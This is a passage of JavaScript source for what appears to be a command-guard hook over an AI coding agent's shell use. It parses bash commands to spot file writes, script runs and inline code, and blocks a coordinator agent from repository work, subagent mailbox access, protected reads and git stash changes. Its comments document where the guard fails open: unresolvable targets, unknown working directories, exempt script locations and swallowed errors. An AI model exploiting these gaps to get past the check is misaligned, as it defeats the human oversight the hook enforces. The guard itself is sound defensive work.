        }
        continue;
      }
      pos.push(t);
    }
    if (inPlace) for (const t of (scriptOpt ? pos : pos.slice(1))) keep(t);
  } else if (verb === 'perl') { // (e)
    let inPlace = false;
    let hasE = false;
    const pos = [];
    for (let i = 0; i < rest.length; i++) {
      const t = rest[i];
      if (t === '--') { pos.push(...rest.slice(i + 1)); break; }
      if (RX124.test(t)) {
        for (let k = 1; k < t.length; k++) {
          const ch = t[k];
          if (ch === 'i') { inPlace = true; break; }
          if (ch === 'e' || ch === 'E') { hasE = true; if (k === t.length - 1) i++; break; }
        }
        continue;
      }
      if (t.startsWith('--')) continue;
      pos.push(t);
    }
    if (inPlace) for (const t of (hasE ? pos : pos.slice(1))) keep(t);
  } else if (verb === 'cp' || verb === 'mv') { // (f)
    let tdir = null;
    const pos = [];
    for (let i = 0; i < rest.length; i++) {
      const t = rest[i];
      if (t === '--') { pos.push(...rest.slice(i + 1)); break; }
      if (t === '-t' || t === '--target-directory') { tdir = rest[i + 1] || null; i++; continue; }
      if (RX125.test(t)) { tdir = t.slice(t.indexOf('=') + 1); continue; }
      if (RX126.test(t)) { tdir = t.slice(2); continue; }
      if (t === '-S' || t === '--suffix') { i++; continue; }
      if (t.startsWith('-')) continue;
      pos.push(t);
    }
    let dest = tdir;
    let srcs = pos;
    if (dest === null) {
      if (pos.length < 2) return out;
      dest = pos[pos.length - 1];
      srcs = pos.slice(0, -1);
    }
    let isDir = tdir !== null || dest.endsWith('/');
    // `superset` (the write pre-check, no directory known): the targets of both answers
    if (!isDir && !superset) {
      try { isDir = fs.statSync(path.resolve(cwd || process.cwd(), dest)).isDirectory(); } catch (_) { isDir = false; }
    }
    if (isDir || superset) for (const s of srcs) keep(path.posix.join(dest, basename(s)));
    if (!isDir) keep(dest);
    if (verb === 'mv') for (const s of srcs) keep(s);
  }
  return out;
}

// cdAwareContexts(segments, delims, payload) -> per segment, the list of
// { cwd, cwdUnknown } it may run in. A literal `cd` before `&&` moves the cwd;
// before `;`/`||`/newline both cwds stay possible; a non-literal `cd` makes
// the cwd unknown.
function cdAwareContexts(segments, delims, payload) {
  const sp = require('./lib/scratchpad.js');
  const start = sp.realpathOrSelf(path.resolve((payload && typeof payload.cwd === 'string' && payload.cwd) || process.cwd()));
  let cur = [{ cwd: start, cwdUnknown: false }];
  const out = [];
  for (let i = 0; i < segments.length; i++) {
    out.push(cur);
    const d = delims[i];
    if (d !== '&&' && d !== ';' && d !== '||' && d !== '\n') continue;
    const toks = tokenizeQuoted(segments[i]);
    if (toks[0] !== 'cd') continue;
    const rawArg = segments[i].trim().slice(2).trim();
    const arg = toks[1];
    let next;
    if (toks.length !== 2 || !arg || arg === '-' || RX127.test(rawArg)) {
      next = cur.map((c) => ({ cwd: c.cwd, cwdUnknown: true }));
    } else {
      next = cur.map((c) => ({
        cwd: sp.realpathOrSelf(path.resolve(c.cwd, arg)),
        cwdUnknown: c.cwdUnknown && !path.isAbsolute(arg),
      }));
    }
    const merged = d === '&&' ? next : cur.concat(next);
    const seen = new Set();
    cur = merged.filter((c) => {
      const k = c.cwd + '\0' + c.cwdUnknown;
      if (seen.has(k)) return false;
      seen.add(k);
      return true;
    }).slice(0, T.cdContextsMax);
  }
  return out;
}

// ---------------------------------------------------------------------------
// Script-file runs and inline interpreter code (coordinator drift, Phase 4).
// A script run is WORK unless an ordered exemption applies: an anti-hall CLI
// (T.antiHallCli), an anti-hall plugin root, a binary/non-file direct
// exec, a freshness-proof managed location, a tracked-and-clean (or
// non-coordinator-writable, old) repo script, or an old script in a personal
// tool dir. Inline `-c`/`-e` code is WORK when it runs state-changing git/gh
// or writes a literal non-notes repo file (precise, blockable); looser matches
// are count-only. Nothing here is executed.
// ---------------------------------------------------------------------------

// argvWithoutRedirects(segment) -> dequoted tokens minus redirect tokens (and a bare operator's target).
function argvWithoutRedirects(segment) {
  const raw = tokenizeQuoted(segment);
  const toks = [];
  for (let i = 0; i < raw.length; i++) {
    if (raw[i] !== '' && REDIRECT_TOKEN_RE.test(raw[i])) { if (BARE_REDIRECT_TOKEN_RE.test(raw[i])) i++; continue; }
    toks.push(raw[i]);
  }
  return toks;
}

// scriptRunToken(segment) -> { token, direct } for `<interpreter> [flags] <file>`
// or a direct exec (argv[0] contains `/`), else null. source/., inline
// -c/-e/-E, -m, `bash -n` and stdin are never script runs.
function scriptRunToken(segment) {
  const verb = effectiveVerb(segment).replace(/["']/g, '');
  if (!verb || verb === 'source' || verb === '.') return null;
  const toks = argvWithoutRedirects(segment);
  const vi = toks.findIndex((t) => basename(t).toLowerCase() === verb);
  if (vi === -1) return null;
  if (T.scriptInterpreters.has(verb)) {
    const fam = T.scriptShells.has(verb) ? 'shell' : verb.startsWith('python') ? 'python' : verb === 'node' ? 'node' : 'rubyperl';
    for (let i = vi + 1; i < toks.length; i++) {
      const t = toks[i];
      if (t === '--') return toks[i + 1] ? { token: toks[i + 1], direct: false } : null;
      if (t === '-') return null;
      if (RX128.test(t) && t.length > 1) {
        if (T.scriptNotRunFlag[fam].test(t)) return null;
        if (T.scriptValueFlags.has(t)) i++;
        continue;
      }
      return { token: t, direct: false };
    }
    return null;
  }
  return toks[vi].includes('/') ? { token: toks[vi], direct: true } : null;
}

// hookHomeRaw() -> the hook's HOME (resolveHome), '' when unavailable; hookHome() realpath'd.
function hookHomeRaw() {
  try { return io.homeOf(guardEnv) || ''; } catch (_) { return ''; }
}
function hookHome() {
  const h = hookHomeRaw();
  return h ? require('./lib/scratchpad.js').realpathOrSelf(h) : '';
}

// resolveScriptPath(token, ctx) -> { real } | { unresolvable: true } | null
// (null: a relative path under an unknown cwd). `~` expands from HOME,
// `$NAME`/`${NAME}` from process.env (PWD = the effective cwd).
function resolveScriptPath(token, ctx) {
  let t = String(token);
  if (t === '~' || t.startsWith('~/')) {
    const h = hookHomeRaw();
    if (!h) return { unresolvable: true };
    t = h + t.slice(1);
  }
  if (RX129.test(t)) return { unresolvable: true };
  let unset = false;
  t = t.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (m, a, b) => {
    const name = a || b;
    const v = name === 'PWD' ? ctx.cwd : guardEnv[name];
    if (typeof v !== 'string' || !v) { unset = true; return ''; }
    return v;
  });
  if (unset || t.includes('$')) return { unresolvable: true };
  if (!path.isAbsolute(t)) {
    if (ctx.cwdUnknown) return null;
    t = ctx.cwd.replace(RX8, '') + '/' + t;
  }
  try { return { real: fs.realpathSync.native(t) }; } catch (_) {
    return { real: require('./lib/scratchpad.js').realpathOrSelf(path.resolve(t)) };
  }
}

// isTextScript(real, st) -> true for a regular file starting with `#!` or with
// no ELF/Mach-O magic in its first 4 bytes; false on a read error.
function isTextScript(real, st) {
  if (!st || !st.isFile()) return false;
  const hex = ah.fs.readHeadHex(real, 4);
  if (hex === null) return false;
  if (hex.length >= 4 && hex.slice(0, 4) === '2321') return true; // "#!"
  return !T.binaryMagics.includes(hex);
}

// gitCleanTracked(root, abs, cache) -> true only when `git status --porcelain
// --ignored -- <rel>` prints nothing (tracked and clean). Memoised per call.
// GIT_OPTIONAL_LOCKS=0: a read-only probe must not refresh/lock .git/index.
function gitCleanTracked(root, abs, cache) {
  const key = root + '\0' + abs;
  if (cache && cache.has(key)) return cache.get(key);
  let clean = false;
  try {
    const out = require('child_process').execFileSync('git', ['status', '--porcelain=v1', '--ignored', '--', path.relative(root, abs)],
      { cwd: root, encoding: 'utf8', timeout: T.gitStatusTimeout, stdio: ['ignore', 'pipe', 'ignore'], env: Object.assign({}, guardEnv, { GIT_OPTIONAL_LOCKS: '0' }) });
    clean = String(out).trim() === '';
  } catch (_) { clean = false; }
  if (cache) cache.set(key, clean);
  return clean;
}

// scriptPathVerdict(real, info) -> { work, step } (pure). info = { root, home,
// fresh, isScratchOrTmp, notesTarget: () => bool, gitClean: () => bool }.
// Decision 3 steps 5-8, first match wins.
function scriptPathVerdict(real, info) {
  const i = info || {};
  const under = (dir) => !!dir && real.startsWith(dir.replace(RX8, '') + '/');
  const root = i.root || null;
  const home = i.home || '';
  const inRoot = !!root && under(root);
  if (i.isScratchOrTmp || (root && under(path.join(root, '.anti-hall')))) return { work: true, step: 'scratch' };
  if (RX130.test(real) || (RX131.test(real) && !inRoot)
    || (home && T.homeManaged.some((d) => under(path.join(home, d))))
    || RX132.test(real) || RX133.test(real)) {
    return { work: false, step: 'managed' };
  }
  if (inRoot) {
    if (!i.fresh && !i.notesTarget()) return { work: false, step: 'in-repo' };
    return { work: !i.gitClean(), step: 'in-repo' };
  }
  if (home && T.homePersonal.some((d) => under(path.join(home, d)))) return { work: !!i.fresh, step: 'outside' };
  return { work: true, step: 'outside' };
}

// scriptFileRun(segment, ctx, payload, opts, cache, rootOf) -> null | { path, step }
// (non-null = a WORK script run). Steps 1-4 here, 5-8 in scriptPathVerdict.
function scriptFileRun(segment, ctx, payload, opts, cache, rootOf) {
  const run = scriptRunToken(segment);
  if (!run) return null;
  const r = resolveScriptPath(run.token, ctx);
  if (!r) return null;
  if (r.unresolvable) return { path: run.token, step: 'unresolvable' };
  if (antiHallCliMatch(segment)) return null;
  const real = r.real;
  if (isInsideAntiHallPlugin(real)) return null;
  let st = null;
  try { st = fs.statSync(real); } catch (_) { st = null; }
  if (run.direct && !isTextScript(real, st)) return null;
  const sp = require('./lib/scratchpad.js');
  const eg = require('./edit-guard.js');
  const home = hookHome();
  const { toplevel } = rootOf(ctx.cwd);
  const root = toplevel || ctx.cwd;
  // A tmp-root path counts as scratch only outside the cwd's git work tree and
  // outside HOME (a HOME that itself lives under a tmp root keeps its own steps).
  const inHome = !!home && sp.isInsideDir(real, home);
  const isScratchOrTmp = isScratchpadOrTmpPath(real, { payload, ownOnly: true })
    || (isScratchpadOrTmpPath(real, { payload }) && !(toplevel && sp.isInsideDir(real, toplevel)) && !inHome);
  const v = scriptPathVerdict(real, {
    root,
    home,
    fresh: !!st && st.isFile() && st.mtimeMs >= opts.sessionStartTs,
    isScratchOrTmp,
    notesTarget: () => eg.isNotesTarget(real, root, Object.assign({}, payload, { cwd: root })),
    gitClean: () => (toplevel ? gitCleanTracked(toplevel, real, cache) : false),
  });
  return v.work ? { path: real, step: v.step } : null;
}

const INLINE_EXEC_RE = /\b(?:subprocess|system|exec|execSync|execFileSync|spawn|spawnSync|popen|child_process)\b|\brun\s*\(|`/;
const INLINE_GIT_GH_LITERAL_RE = /(['"`])\s*((?:git|gh)\s[^'"`]*)\1/g;
const INLINE_GIT_GH_ARRAY_RE = /\[\s*(['"])(git|gh)\1((?:\s*,\s*(['"])[^'"]*\4)*)\s*\]/g;
const INLINE_OPEN_RE = /\bopen\s*\(\s*(['"])([^'"]+)\1\s*,\s*(['"])([^'"]*)\3\s*[,)]/g;
const INLINE_OPEN_NONLIT_RE = /\bopen\s*\(\s*[^'"\s)][^,)]*,\s*(['"])([^'"]*)\1\s*[,)]/g;
const INLINE_PERL_OPEN3_RE = /\bopen\s*\(?\s*(?:my\s+)?[$\w]+\s*,\s*(['"])\s*\+?(>>?|\+<)[:\w]*\s*\1\s*,\s*(['"])([^'"]+)\3/g;
// Perl dup modes (>&, >&=, >>&, 2-arg >-) open an existing handle, not a file: the 3-arg
// mode class [:\w]* cannot consume `&`, and the 2-arg target excludes `&`, `=`, `-` as first char.
const INLINE_PERL_OPEN2_RE = /\bopen\s*\(?\s*(?:my\s+)?[$\w]+\s*,\s*(['"])\s*\+?>>?\s*([^'"\s>&=-][^'"\s]*)\s*\1/g;
const INLINE_WRITEFILE_RE = /(?:(?:write|append)File(?:Sync)?|createWriteStream)\(\s*(['"])([^'"]+)\1/g;
const INLINE_FILE_WRITE_RE = /(?:File|IO)\.write\(\s*(['"])([^'"]+)\1/g;
const INLINE_WRITE_NONLIT_RE = /(?:(?:write|append)File(?:Sync)?|(?:File|IO)\.write)\(\s*[^'"\s)]/;
const INLINE_REDIRECT_RE = /['"][^'"]*\s>>?\s*([\w./~-]+)/;
const isWriteMode = (m) => RX134.test(m) && RX135.test(m);

// inlineCodeBody(segment) -> the `python|python3 -c` / `perl|ruby|node -e|-E`
// code string, or null when the segment carries none.
function inlineCodeBody(segment) {
  const verb = effectiveVerb(segment).replace(/["']/g, '');
  if (!T.inlineVerbs.has(verb)) return null;
  const toks = tokenizeQuoted(segment);
  const vi = toks.findIndex((t) => basename(t).toLowerCase() === verb);
  const flags = verb.startsWith('python') ? T.inlinePythonFlags : T.inlineOtherFlags;
  const fi = toks.findIndex((t, k) => k > vi && flags.includes(t));
  if (vi === -1 || fi === -1 || typeof toks[fi + 1] !== 'string') return null;
  return toks[fi + 1];
}

// inlineWriteLiterals(segment) -> literal paths inline code writes: open(<lit>,
// <write mode>), (write|append)File[Sync](<lit>), File/IO.write(<lit>). A
// non-literal target is not returned (unknowable, fail open).
function inlineWriteLiterals(segment) {
  const body = inlineCodeBody(segment);
  if (body === null) return [];
  const literals = [];
  for (const m of body.matchAll(INLINE_OPEN_RE)) if (isWriteMode(m[4])) literals.push(m[2]);
  for (const m of body.matchAll(INLINE_PERL_OPEN3_RE)) literals.push(m[4]);
  for (const m of body.matchAll(INLINE_PERL_OPEN2_RE)) literals.push(m[2]);
  for (const m of body.matchAll(INLINE_WRITEFILE_RE)) literals.push(m[2]);
  for (const m of body.matchAll(INLINE_FILE_WRITE_RE)) literals.push(m[2]);
  return literals;
}

// inlineCodeWork(segment, ctx, payload, rootOf) -> null | { precise } for
// `python|python3 -c` / `perl|ruby|node -e|-E` bodies (Decision 3, never executed).
function inlineCodeWork(segment, ctx, payload, rootOf) {
  const body = inlineCodeBody(segment);
  if (body === null) return null;
  const exec = INLINE_EXEC_RE.test(body);
  if (exec) {
    const cmds = [];
    for (const m of body.matchAll(INLINE_GIT_GH_LITERAL_RE)) cmds.push(m[2]);
    for (const m of body.matchAll(INLINE_GIT_GH_ARRAY_RE)) {
      cmds.push([m[2]].concat([...m[3].matchAll(/(['"])([^'"]*)\1/g)].map((x) => x[2])).join(' '));
    }
    if (cmds.some((c) => isStateChangingGitSegment(c) || isHeavyGhSegment(c, c))) return { precise: true };
  }
  const sp = require('./lib/scratchpad.js');
  // 'tmp' (tmp/scratch), 'notes' (a coordinator-writable repo file), 'repo' (non-notes repo file) or 'outside'.
  const targetKind = (t) => {
    if (ctx.cwdUnknown && !path.isAbsolute(t) && !t.startsWith('~')) return 'outside';
    const expanded = t === '~' || t.startsWith('~/') ? hookHomeRaw() + t.slice(1) : t;
    const resolved = path.resolve(ctx.cwd, expanded);
    const abs = path.join(sp.realpathOrSelf(path.dirname(resolved)), path.basename(resolved));
    const r = rootOf(ctx.cwd);
    const inTop = !!r.toplevel && sp.isInsideDir(abs, r.toplevel);
    if (isScratchpadOrTmpPath(abs, { payload, ownOnly: true })) return 'tmp';
    if (!inTop && isScratchpadOrTmpPath(abs, { payload })) return 'tmp';
    if (!sp.isInsideDir(abs, r.base)) return 'outside';
    return require('./edit-guard.js').isNotesTarget(abs, r.base, Object.assign({}, payload, { cwd: r.base })) ? 'notes' : 'repo';
  };
  const literals = inlineWriteLiterals(segment);
  let loose = false;
  for (const t of literals) {
    const k = targetKind(t);
    if (k === 'repo') return { precise: true };
    if (k === 'outside') loose = true;
  }
  if ([...body.matchAll(INLINE_OPEN_NONLIT_RE)].some((m) => isWriteMode(m[2])) || INLINE_WRITE_NONLIT_RE.test(body)) loose = true;
  if (exec) {
    const m = body.match(INLINE_REDIRECT_RE);
    if (m && targetKind(m[1]) !== 'tmp') loose = true;
  }
  return loose ? { precise: false } : null;
}


// resolveWriteTarget(t, ctx, payload, rootOf) -> null (an expansion, glob, `~`
// or a relative path under an unknown cwd: unknowable, fail open) or
// { abs, base, toplevel, inBase, scratch }. abs has its directory part
// realpath'd (/tmp -> /private/tmp) and its last component kept, so edit-guard
// still sees a symlink. scratch = this session's own scratchpad, or a tmp root
// outside a git work tree (a repo that lives under /tmp is still a repo).
// base = the cwd's git toplevel, else the session's project base (rootOf).
function resolveWriteTarget(t, ctx, payload, rootOf) {
  if (typeof t !== 'string' || !t || RX136.test(t) || t.startsWith('~')) return null;
  if (ctx.cwdUnknown && !path.isAbsolute(t)) return null;
  const sp = require('./lib/scratchpad.js');
  const resolved = path.resolve(ctx.cwd, t);
  const abs = path.join(sp.realpathOrSelf(path.dirname(resolved)), path.basename(resolved));
  const r = rootOf(ctx.cwd);
  const inTop = !!r.toplevel && sp.isInsideDir(abs, r.toplevel);
  const scratch = isScratchpadOrTmpPath(abs, { payload, ownOnly: true })
    || (!inTop && isScratchpadOrTmpPath(abs, { payload }));
  return { abs, base: r.base, toplevel: r.toplevel, inBase: sp.isInsideDir(abs, r.base), scratch };
}

// projectRootResolver(payload) -> rootOf(cwd) -> { toplevel, base }, memoised.
// base = the cwd's git toplevel; with none, the SESSION's project base (the
// payload cwd's toplevel, or the payload cwd itself). A `cd` into a non-git
// dir (e.g. ~/.claude/projects/<slug>/memory) does not make that dir a
// project root: its files are judged against the session project, as an
// Edit-tool write to the same file would be.
function projectRootResolver(payload) {
  const sp = require('./lib/scratchpad.js');
  const p = payload || {};
  const roots = new Map();
  const startCwd = sp.realpathOrSelf(path.resolve((typeof p.cwd === 'string' && p.cwd) || process.cwd()));
  const rootOf = (cwd) => {
    if (!roots.has(cwd)) {
      let toplevel = null;
      try { toplevel = require('../companion/lib/identity.js').resolveContext(cwd, { missingPath: 'ancestor' }).toplevel || null; } catch (_) { toplevel = null; }
      if (toplevel) toplevel = sp.realpathOrSelf(toplevel);
      const base = toplevel || (cwd === startCwd ? cwd : rootOf(startCwd).base);
      roots.set(cwd, { toplevel, base });
    }
    return roots.get(cwd);
  };
  return rootOf;
}

// shellRunPayloads(segments, text) -> the command strings these segments run
// inline: `sh -c '<cmd>'`, `eval <cmd>`, and a heredoc fed to a shell
// (`bash <<EOF` with no -c: the body is a script, not data).
// withIndex: return [{ cmd, i }] (i = the segment that runs it) instead.
// Whether the Bash write scan could find a target Node would judge, in the command or anything it runs inline: no cwd is needed to
// say that nothing can be a write target (a target Node skips without looking at the file system, one with an expansion or glob
// character or a leading `~`, does not count). It lets the edit parity skip the repository questions for the common command.
function cmdResolvableTarget(t) {
  if (!t) return false;
  for (const ch of T.unknowable) if (t.includes(ch)) return false;
  return t.charAt(0) !== '~';
}
function cmdMayWrite(command, depth) {
  if (typeof command !== 'string' || !command.trim() || command.length > T.maxLen) return false;
  const masked = RX137.test(command) ? maskProcessSubstitutions(command) : { text: command, inners: [] };
  const text = blankTestOperators(masked.text);
  const { segments } = splitSegmentsDetailed(text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}(?![A-Za-z0-9_])/g, '$$$1'));
  for (const seg of segments) {
    if (effectiveVerb(seg) === 'git') continue; // a git segment never adds an edit block
    if (bashWriteTargets(seg, undefined, true).some(cmdResolvableTarget)) return true;
    const body = inlineCodeBody(seg);
    if (body !== null && T.inlineWriteMarkers.some((m) => body.includes(m))) return true;
  }
  if (depth < T.maxDepth) {
    const inner = shellRunPayloads(segments, text);
    inner.push(...extractSubstitutions(text), ...masked.inners);
    return inner.some((s) => cmdMayWrite(s, depth + 1));
  }
  return false;
}

function shellRunPayloads(segments, text, withIndex) {
  const out = [];
  let bodies = null;
  const add = (cmd, i) => out.push(withIndex ? { cmd, i } : cmd);
  segments.forEach((seg, i) => {
    const c = extractShellCPayload(seg);
    if (c) add(c, i);
    const e = extractEvalPayload(seg);
    if (e) add(e, i);
    if (!c && T.shellVerbs.has(effectiveVerb(seg)) && seg.includes('<<')) {
      if (!bodies) bodies = segmentHeredocBodies(segments, text);
      const b = bodies[i] || [];
      if (b.length && b[b.length - 1]) add(b[b.length - 1], i);
    }
  });
  return out;
}

// forEachShellSegment(command, payload, fn) -> calls fn(seg, ctxs, segments,
// delims, i) for every segment of `command` and, up to depth 3, of the
// commands it runs inline (`sh -c`, eval, `$(…)`, backticks, `>(…)`). ctxs =
// the cd-aware cwds the segment may run in. The same walk classifyBashWork
// does; used by lib/shell-writes.js. No-op on non-string / oversized input.
function forEachShellSegment(command, payload, fn, depth = 0) {
  if (typeof command !== 'string' || !command.trim() || command.length > T.maxLen) return;
  const p = payload || {};
  const masked = RX137.test(command) ? maskProcessSubstitutions(command) : { text: command, inners: [] };
  masked.text = blankTestOperators(masked.text);
  const { segments, delims } = splitSegmentsDetailed(masked.text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}(?![A-Za-z0-9_])/g, '$$$1'));
  const ctxs = cdAwareContexts(segments, delims, p);
  segments.forEach((seg, i) => fn(seg, ctxs[i], segments, delims, i, masked.text));
  if (depth >= T.maxDepth) return;
  // An inline command runs in its segment's cwd: recurse with that cwd when it
  // is the one known cwd, else skip it (its relative targets are unknowable).
  for (const { cmd, i } of shellRunPayloads(segments, masked.text, true)) {
    const c = ctxs[i] || [];
    if (c.length === 1 && !c[0].cwdUnknown) forEachShellSegment(cmd, Object.assign({}, p, { cwd: c[0].cwd }), fn, depth + 1);
  }
  for (const sub of extractSubstitutions(masked.text).concat(masked.inners)) forEachShellSegment(sub, payload, fn, depth + 1);
}

// opts.env: score under that env (the caller's evaluate() env), restored on return.
function classifyBashWork(command, payload, opts = {}, depth = 0, shared = null) {
  if (depth !== 0 || !opts || !opts.env) return classifyBashWorkImpl(command, payload, opts, depth, shared);
  const prev = guardEnv;
  guardEnv = opts.env;
  try { return classifyBashWorkImpl(command, payload, opts, depth, shared); } finally { guardEnv = prev; }
}

function classifyBashWorkImpl(command, payload, opts = {}, depth = 0, shared = null) {
  const res = { work: false, blockable: false, labels: new Set(), editBlocks: [] };
  if (typeof command !== 'string' || !command.trim() || command.length > T.maxLen) return res;
  const o = Object.assign({ sessionStartTs: ah.clock.now() - 21600000 }, opts || {});
  const p = payload || {};
  const sh = shared || { command, gitCache: new Map(), trusted: undefined };
  const trusted = () => {
    if (sh.trusted === undefined) {
      try { sh.trusted = !!matchedProjectCommandAllowPattern(sh.command, (typeof p.cwd === 'string' && p.cwd) || ''); } catch (_) { sh.trusted = false; }
    }
    return sh.trusted;
  };
  const eg = require('./edit-guard.js');
  // Session project roots (see projectRootResolver).
  const rootOf = projectRootResolver(p);
  const blocks = new Set();

  const masked = RX137.test(command) ? maskProcessSubstitutions(command) : { text: command, inners: [] };
  // `(( n > 5 ))` / `$((3 > 2))`: the splitter cuts at `(`, so comparisons are
  // blanked before splitting or they would read as redirects.
  masked.text = blankTestOperators(masked.text);
  // `${NAME}` -> `$NAME` (not before an identifier char): the splitter cuts at braces.
  const { segments, delims } = splitSegmentsDetailed(masked.text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}(?![A-Za-z0-9_])/g, '$$$1'));
  const ctxs = cdAwareContexts(segments, delims, p);
  segments.forEach((seg, i) => {
    let segWork = false;
    let recovery = false;
    if (isStateChangingGitSegment(seg)) {
      segWork = true;
      res.labels.add('git');
      if (isRecoveryGitSegment(seg)) { recovery = true; res.labels.add('recovery'); }
    }
    if (isHeavyGhSegment(seg, command)) { segWork = true; res.labels.add('gh'); }
    const isGit = effectiveVerb(seg) === 'git';
    for (const ctx of ctxs[i]) {
      if (!o.editOnly && scriptFileRun(seg, ctx, p, o, sh.gitCache, rootOf) && !trusted()) { segWork = true; res.labels.add('script'); }
      const inl = o.editOnly ? null : inlineCodeWork(seg, ctx, p, rootOf);
      if (inl) {
        res.work = true;
        res.labels.add('inline');
        if (inl.precise) segWork = true;
      }
      // Inline-code literal targets (python -c open(..,'w')) only feed the
      // edit block; their WORK count already comes from inlineCodeWork above.
      const targets = bashWriteTargets(seg, ctx.cwd).map((t) => [t, true])
        .concat(inlineWriteLiterals(seg).map((t) => [t, false]));
      for (const [t, countsAsWork] of targets) {
        const w = resolveWriteTarget(t, ctx, p, rootOf);
        if (!w || w.scratch || !w.inBase) continue; // F3 judges writes into the session project only
        const egPayload = Object.assign({}, p, { cwd: w.base });
        if (countsAsWork && !eg.isNotesTarget(w.abs, w.base, egPayload)) {
          segWork = true;
          res.labels.add('repo-write');
        }
        if (!isGit && eg.editVerdict(w.abs, w.base, egPayload) !== 'allow') blocks.add(w.abs);
      }
    }
    if (segWork) {
      res.work = true;
      if (!recovery) res.blockable = true;
    }
  });

  if (depth < T.maxDepth) {
    const inner = shellRunPayloads(segments, masked.text);
    inner.push(...extractSubstitutions(masked.text), ...masked.inners);
    for (const sub of inner) {
      const r = classifyBashWork(sub, payload, o, depth + 1, sh);
      res.work = res.work || r.work;
      res.blockable = res.blockable || r.blockable;
      for (const l of r.labels) res.labels.add(l);
      for (const b of r.editBlocks) blocks.add(b);
    }
  }
  res.editBlocks = [...blocks];
  return res;
}

// Returns the decision ({exitCode, stdout, stderr}); every block is a RETURNED
// io.blockDecision(), never an exit, so the fail-open try/catch blocks below
// cannot swallow it. `payload` is the parsed stdin (undefined when unreadable).

// ---------------------------------------------------------------------------------------------------------------------
// the decision (hooks/command-guard.js `main`)

// guard-io `homeOf(env)`: HOME, else USERPROFILE; with neither the hook asks the system, which is not reproduced
var io = {
  homeOf: function () {
    var h = ah.env.get(ah.cfg('env.home'));
    if (h === null || h === '') h = ah.env.get(ah.cfg('env.home_alt'));
    if (h === null || h === '') unsure();
    return h;
  },
};
var guardEnv = process.env;
var bm = function () { return LIB['./lib/block-message.js']; };

function lightList() { return S.light; }
function antiHallCliMatch(segment) {
  return T.antiHallCli.some(function (re) { return re.test(segment); }) || launcherRegexes(segment).some(function (re) { return re.test(segment); });
}

// anchoredAntiHallStableLauncher: `node ~/.anti-hall/bin/<script>` in any of the forms the request's homes allow
function launcherRegexes(cmd) {
  if (cmd.toLowerCase().indexOf(ah.cfg('command.launcher_marker')) < 0) return [];
  var homes = [], sh = spawn.stateHome();
  if (sh.unknown) unsure();
  if (sh.ok) homes.push(sh.ok);
  var pw = ah.env.passwdHome();
  if (pw && homes.indexOf(pw) < 0) homes.push(pw);
  var alt = '(?:~|"?\\$\\{HOME\\}"?|\\$HOME' + (homes.length ? '|' + homes.map(cmdEsc).join('|') : '') + ')';
  return ah.cfg('command.launcher_scripts').map(function (s) {
    return new RegExp('^\\s*(?:[A-Za-z_][A-Za-z0-9_]*=\\S*\\s+)*node\\s+' + alt + '[\\\\/]\\.anti-hall[\\\\/]bin[\\\\/]' + cmdEsc(s) + '(?=\\s|$)', 'i');
  });
}

function blockExact(reason) {
  return { exact: { code: 2, out: JSON.stringify({ decision: 'block', reason: reason }) + '\n', err: reason + '\n' } };
}

// A fail-open block of Node: its own failures allow, ours (a question only the hook can answer, a stack overflow) defer.
function guarded(fn) {
  try { return fn(); } catch (e) { if (cmdFatal(e)) throw e; ah.log('command_swallowed', String((e && e.stack) || e)); return undefined; }
}

function mainFlow(payload) {
  const isSkipped = (name) => cmdSkipped(name);
  const command = (payload && payload.tool_input && payload.tool_input.command) || '';
  const bm = LIB['./lib/block-message.js'];
  let hit;
  hit = guarded(() => {
    const devswarmActive = guarded(() => LIB['./lib/devswarm-detect.js'].isDevswarmActive()) || false;
    if (devswarmActive && !isSkipped(ah.cfg('command.dsread_guard'))) {
      const kind = detectHivectlDestructiveRead(command);
      if (kind) return blockExact(buildDevswarmReason(kind, guardEnv));
      const cwd = (payload && payload.cwd) || '';
      const fileKind = detectProtectedFileRead(command, io.homeOf(), cwd);
      if (fileKind) return blockExact(buildRawFileReadReason(fileKind));
    }
    return undefined;
  });
  if (hit) return hit;
  hit = guarded(() => {
    const devswarmActive = guarded(() => LIB['./lib/devswarm-detect.js'].isDevswarmActive()) || false;
    if (devswarmActive && !isSkipped(ah.cfg('command.dssend_guard'))) {
      const sendKind = detectHivectlMessageSend(command);
      if (sendKind) return blockExact(buildDevswarmSendReason(sendKind));
    }
    return undefined;
  });
  if (hit) return hit;
  hit = guarded(() => {
    const { isSubagentByPayload } = LIB['./coordinator-detect.js'];
    if (isSubagentByPayload(payload)
      && settingsGet('guards', 'allowSubagentMailbox') !== true
      && !isSkipped(ah.cfg('command.mailbox_guard'))
      && detectSubagentMailboxTouch(command)) {
      return blockExact(buildSubagentMailboxReason());
    }
    return undefined;
  });
  if (hit) return hit;
  hit = guarded(() => {
    if (!isSkipped(ah.cfg('command.stash_guard'))) {
      const stashSub = detectMutatingGitStash(command);
      if (stashSub) {
        const cwd = (payload && payload.cwd) || '';
        const armed = hasProtectedStashesMarker(cwd) || settingsGet('guards', 'stashGuard') === true;
        if (armed) {
          const subagent = LIB['./coordinator-detect.js'].isSubagentByPayload(payload);
          return blockExact(buildGitStashReason(stashSub, subagent));
        }
      }
    }
    return undefined;
  });
  if (hit) return hit;
  if (isSkipped(ah.cfg('command.guard_name'))) return 'allow';
  guarded(() => { if (!settings.enabled('safety', 'commandGuard')) S.off = true; });
  if (S.off) return 'allow';
  if (!coordinator.isCoordinator(payload)) return 'allow';
  hit = guarded(() => {
    if (cmdMayWrite(command, 0)
      && settingsGet('guards', 'bashEditParity') !== false
      && settings.enabled('safety', 'editGuard')
      && !isSkipped(ah.cfg('command.edit_guard_name'))
      && !matchedProjectCommandAllowPattern(command, (payload && payload.cwd) || '')) {
      if (command.length > T.maxLen) unsure(); // a very large command is judged in parts, which the engine does not reproduce
      if (classifyBashWork(command, payload, { editOnly: true }).editBlocks.length) {
        return blockExact(LIB['./edit-guard.js'].delegationReason('Bash (sed -i/perl -i/tee/cp/mv/redirect/inline-code write)', payload.cwd, payload));
      }
    }
    return undefined;
  });
  if (hit) return hit;
  S.light = T.light.concat(launcherRegexes(command));
  if (!isHeavyCommand(command)) return 'allow';
  if (guarded(() => settingsGet('guards', 'allowReadOnlyVerify') !== false && isBoundedVerificationCommand(command, { payload: payload }))) return 'allow';
  if (guarded(() => {
    if (settingsGet('guards', 'projectCommandAllow') !== false) {
      const cwd = (payload && payload.cwd) || '';
